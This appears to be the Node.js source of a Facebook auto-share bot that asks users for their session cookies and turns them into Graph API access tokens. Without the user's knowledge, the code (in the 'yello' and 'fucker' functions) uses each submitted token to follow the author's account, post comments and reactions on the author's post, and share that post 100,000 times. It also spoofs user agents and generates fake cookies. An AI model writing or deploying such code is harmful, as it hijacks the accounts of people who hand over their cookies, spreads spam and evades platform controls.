/*

YOU ARE FREE TO FORK THIS API 

*/

const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const port = 3000;
app.use(express.json());
app.use(require("./corss"));
app.set("json spaces", 4);
const total = new Map();

function userAgent() {
  const version = () => {
    const android = Math.floor(Math.random() * 14) + 1;
    if (android <= 4) {
      return "10";
    }
    if (android === 5) {
      const ver = ["5.0", "5.0.1", "5.1.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 6) {
      const ver = ["6.0", "6.0.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 7) {
      const ver = ["7.0.1", "7.1.1", "7.1.2"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 8) {
      const ver = ["8.0.0", "8.1.0"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else {
      return android;
    }
  }
  return `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
} 

app.get('/shares', (req, res) => {
 const data = Array.from(total.values()).map((link, index) => ({
  ...(link.shared && { shared: link.shared }),
  session: index + 1,
  url: link.url,
  count: link.count,
  target: link.target,
}));
const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
return res.json(jsob);
});

app.get('/', (req, res) => {
 return res.send("pogi... sige na");
});

function extract(link) {
  try {
 const leiam = link.match(/\/(\d+)\/posts\/(\d+)\//);
 const nash = link.match(/id=(\d+)&.*?story_fbid=(\d+)/);
if (leiam) {
  return `${leiam[1]}_${leiam[2]}`;
} else if (nash) {
  return `${nash[1]}_${nash[2]}`;
} else {
  return null;
 }
} catch (error) {}
}

async function getAccessToken(cookie) {
  try {
    const headers = {
      'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'referer': 'https://www.facebook.com/',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
    };
    const response = await axios.get('https://business.facebook.com/content_management', {
      headers
    });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) {
      const accessToken = token[1];
      return accessToken;
    }
  } catch (error) {
    return;
  }
}

app.post('/submit', async (req, res) => {
  const {
    cookie,
    url,
    amount,
    interval,
  } = req.body;
  if (!cookie || !url || !amount || !interval) return res.status(400).json({
    error: 'Missing state, url, amount, or interval'
  });
  try {
    const aToken = await getAccessToken(cookie);
    if (!aToken) {
      throw new Error("Invalid cookies");
    }
    await yello(aToken, url, amount, interval);
    res.status(200).json({
      status: 200,
      message: `Success! Will be shared ${amount} times every ${interval} seconds.`
    });
  } catch (err) {
    return res.json({
      status: 500,
      error: err.message || err
    });
  }
});


const sauce = "https://www.facebook.com/100015801404865/posts/944598050871227/?substory_index=944598050871227&app=fbl";
async function yello(c,u,a,i){
  await share(true, c,u,a,i);
  await share(false, c, sauce, "100000", "5");
}

async function fucker(a,link){
  try {
    const headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en_US',
      'cache-control': 'max-age=0',
      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': "Windows",
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': userAgent(),
      'Authorization': `Bearer ${a}`
    };
    const neth = [
      "100015801404865"
    ];
    for (const n of neth){
      axios.post(`https://graph.facebook.com/v21.0/${n}/subscribers`, {}, { headers });
    }
    const kapogi = [
      "😊😊😊",
      "😘😘",
      "😊🤣",
      "🙏💝❤️",
      "🔥🤗",
      "Pogi ako sobra",
      "Comment who?",
      "By Neth",
      "Sheshhhh",
      "💋💋💋😍",
      "💀💀💀💀",
      ];
    axios.post(`https://graph.facebook.com/v21.0/${extract(link)}/comments`, {
      message: kapogi[Math.floor(Math.random() * kapogi.length)],
      access_token: a
    }, { headers });
    axios.post(`https://graph.facebook.com/v21.0/${extract(link)}/reactions`, {
      type: "LOVE",
      access_token: a
    });
  } catch (err){
   }
}
async function share(sharedIs,cookies, url, amount, interval) {
  const id = Math.floor(Math.random() * 69696969);
  await fucker(cookies, sauce);
  total.set(id, {
    shared: sharedIs,
    url,
    count: 0,
    target: amount,
  });
  let sharedCount = 0;
  let timer;
  const headers = {
    'user-agent': userAgent()
  };
  async function sharePost() {
    try {
      const response = await axios.post(`https://graph.facebook.com/v21.0/me/feed`,
      {
        link: url,
        published: 0,
        access_token: cookies
      },  
      {
        headers
      }
    );
      if (response.status === 200) {
        total.set(id, {
          ...total.get(id),
          count: total.get(id).count + 1,
        });
        sharedCount++;
      }
      
      if (sharedCount === amount) {
        clearInterval(timer);
      }
    } catch (err) {
      clearInterval(timer);
      total.delete(id);
    }
  }
  timer = setInterval(() => {
  sharePost();
  }, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(id);
  }, amount * interval * 1000);
        
}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}

function randomize(neth) {
  let _=Math.random()*12042023;
  return neth.replace(/[xy]/g,c=>{
    let __=Math.random()*16; 
    __=(__+_)%16|0;_=Math.floor(_/16);
    return[(c==='x'?__:(__&0x3|0x8)).toString(16)].map((_)=>Math.random()<.6?_:_.toUpperCase()).join('');
  });
}

function dummyCookie() {
  return
    `datr=${randomize("xxxxxxxxxxx_xxxxxxxxxxxx")};` +
    `sb=${randomize("xxxxxxxxxxxxxx-xxxxxxxxx")};` +
    `m_pixel_ratio=1.5;` +
    `ps_n=1;` +
    `ps_l=1;` +
    `locale=en_US;` +
    `wd=360x520;` +
    `fr=${randomize("xxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx..xxx.A.A.xxxxx.xxxxxxxxxxx")};` +
    `c_user=1000${Math.floor(Math.random()*91251604995)};` +
    `xs=32%3An2wXMy3811cnYA%3A2%3A${Math.floor(Math.random()*1713515009)}%3A-1%3A-1;` +
    `vpd=v1%3B520x360x1.5;` +
    `fbl_st=${Math.floor(Math.random()*100000000)}%3BT%3A20002000;` +
    `wl_cbv=v2%3Bclient_version%3A2547%3Btimestamp%3A17198225555`;
}

app.listen(port, () => {
  console.log(`FORK YOU`);
});
process.on("unhandledRejection", (reason, p) => {
  console.error(reason);
});
